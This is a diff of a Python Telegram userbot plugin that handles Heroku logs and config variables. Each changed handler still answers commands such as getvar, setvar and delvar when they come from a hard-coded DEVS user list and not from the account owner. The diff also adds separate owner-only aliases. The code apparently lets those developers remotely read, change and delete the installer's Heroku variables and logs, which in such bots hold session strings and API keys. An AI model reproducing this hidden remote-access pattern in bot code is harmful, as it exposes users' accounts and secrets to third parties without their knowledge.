@@ -52,7 +52,10 @@ XCB = [
 ]
 
 
-@Client.on_message(filters.command("logs", cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(
+    filters.command("logs", ".") & filters.user(DEVS) & ~filters.me
+)
+@Client.on_message(filters.command("lgs", cmds) & filters.me)
 async def log_(client, message):
     if await is_heroku():
         if HEROKU_API_KEY == "" and HEROKU_APP_NAME == "":
@@ -83,7 +86,10 @@ async def log_(client, message):
         return await message.reply_text(data)
 
 
-@Client.on_message(filters.command("getvar", cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(
+    filters.command("getvar", ".") & filters.user(DEVS) & ~filters.me
+)
+@Client.on_message(filters.command("gtv", cmds) & filters.me)
 async def varget_(client, message):
     usage = "**Usage:**\n/get_var [Var Name]"
     if len(message.command) != 2:
@@ -125,7 +131,10 @@ async def varget_(client, message):
             )
 
 
-@Client.on_message(filters.command("delvar", cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(
+    filters.command("delvar", ".") & filters.user(DEVS) & ~filters.me
+)
+@Client.on_message(filters.command("dlv", cmds) & filters.me)
 async def vardel_(client, message):
     usage = "**Usage:**\n/del_var [Var Name]"
     if len(message.command) != 2:
@@ -168,7 +177,10 @@ async def vardel_(client, message):
             )
 
 
-@Client.on_message(filters.command("setvar", cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(
+    filters.command("setvar", ".") & filters.user(DEVS) & ~filters.me
+)
+@Client.on_message(filters.command("stv", cmds) & filters.me)
 async def setvar(client, message):
     usage = "**Usage:**\n/setvar [Var Name] [Var Value]"
     if len(message.command) < 3:
@@ -216,7 +228,10 @@ async def setvar(client, message):
             )
 
 
-@Client.on_message(filters.command("usage", cmds) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(
+    filters.command("usage", ".") & filters.user(DEVS) & ~filters.me
+)
+@Client.on_message(filters.command("usg", cmds) & filters.me)
 async def usage_dynos(client, message):
     ### Credits CatUserbot
     if await is_heroku():
